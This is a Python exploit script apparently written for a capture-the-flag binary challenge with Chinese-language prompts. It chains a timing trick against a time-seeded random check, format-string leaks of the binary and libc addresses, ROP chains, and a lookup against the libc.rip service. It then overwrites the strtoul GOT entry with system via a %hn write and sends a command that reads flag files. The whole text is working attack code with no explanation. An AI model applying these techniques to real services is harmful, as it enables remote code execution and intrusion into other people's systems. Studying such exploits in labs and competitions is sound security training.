import time, re, json, urllib.request
from lib78 import *

COMMAND = b'cat /flag*;cat /home/*/flag*;ls /\n'


def align_send(c, data, lo=0.08, hi=0.30):
    while True:
        t = time.time()
        f = t % 1
        if lo <= f <= hi:
            c.send(data)
            return t
        time.sleep(0.008)


def libc_lookup(puts_addr, start_main_ret):
    body = json.dumps({"symbols": {"puts": hex(puts_addr), "__libc_start_main_ret": hex(start_main_ret)}}).encode()
    req = urllib.request.Request('https://libc.rip/api/find', data=body, headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)


def fmt_addr(spec, target):
    b = spec.encode() + b'\x00'
    b += b'\x00' * (16 - len(b))
    return b + p64(target)


def attempt(verbose=True):
    c = Conn()
    if not (0.15 <= c.frac() <= 0.70):
        c.close(); return None
    c.read_until(b'\n'); c.pull(0.35)
    gate1_send(c)
    out, ok = c.read_until('说出你想要说的话吧'.encode())
    if not ok:
        c.close(); return None

    t1 = align_send(c, b'%15$p.%17$p\n')
    out, ok = c.read_until('如果只是许愿'.encode())
    m = re.findall(rb'0x[0-9a-f]+', out)
    if len(m) < 2:
        c.close(); return None
    base = int(m[0], 16) - OFF_RET_MAIN
    libc_ret = int(m[1], 16)
    if verbose:
        print('[+] base=%#x libc_ret=%#x' % (base, libc_ret))

    c.read_until('做你想要做的事吧'.encode())
    c.send(str(GlibcRand(int(t1)).next()).encode() + b'\n')
    out, ok = c.read_until('做你想要做的事吧'.encode())
    if not ok:
        c.close(); return None

    # ---- 第一轮：泄漏 puts ----
    chain1 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + 0x1428]
    p1 = b'A' * 0x40 + p64(0) + b''.join(p64(x) for x in chain1)
    c.send(p1)
    t2 = align_send(c, fmt_addr('%6$s', base + OFF_PUTS_GOT))
    time.sleep(0.6); c.pull(0.5)
    raw = c.buf; c.buf = b''
    if raw[:2] == b':\n':
        raw = raw[2:]
    puts_addr = int.from_bytes(raw[:6], 'little')
    if verbose:
        print('[*] puts leak bytes:', raw[:8].hex())
    if not (0x700000000000 < puts_addr < 0x800000000000):
        print('[!] puts 泄漏异常'); c.close(); return None
    if verbose:
        print('[+] puts=%#x' % puts_addr)

    matches = libc_lookup(puts_addr, libc_ret)
    if not matches:
        print('[!] libc 未匹配'); c.close(); return None
    sym = matches[0]['symbols']
    system = libc_ret - int(sym['__libc_start_main_ret'], 16) + int(sym['system'], 16)
    if verbose:
        print('[+] libc=%s  system=%#x' % (matches[0]['id'], system))

    # ---- guess_rand 读一个数（对错无所谓，返回值已被我们接管） ----
    c.read_until('做出你的选择吧'.encode(), timeout=4)
    c.send(b'1\n')
    time.sleep(0.6)
    c.pull(0.5)
    if verbose:
        print('[*] guess_rand tail:', c.buf[-40:])
    c.buf = b''

    # ---- 第二轮：写 GOT ----
    got = base + OFF_STRTOUL_GOT
    lo = system & 0xffff
    hi = (system >> 16) & 0xffff
    d = (hi - lo) % 0x10000
    fs = ('%%%dc%%16$hn%%%dc%%17$hn' % (lo, d)).encode()
    if verbose:
        print('[*] fmt len', len(fs))
    chain2 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, got, got + 2]
    p2 = b'A' * 0x40 + p64(0) + b''.join(p64(x) for x in chain2)
    assert len(p2) == 0x70
    c.send(p2)
    align_send(c, fs)
    time.sleep(0.8); c.pull(0.8)
    if verbose:
        print('[*] after write tail:', c.buf[-50:])
    c.buf = b''

    # ---- 交给 system ----
    time.sleep(0.2)
    c.send(COMMAND)
    time.sleep(1.5); c.pull(1.5)
    data = c.buf
    c.close()
    return data


if __name__ == '__main__':
    for i in range(10):
        try:
            r = attempt()
            if r:
                print('=== 输出 ===')
                print(r.decode('utf-8', 'replace'))
                if 'HTUCTF' in r.decode('utf-8', 'replace') or 'flag' in r.decode('utf-8', 'replace').lower():
                    break
        except Exception as e:
            print('err', repr(e))
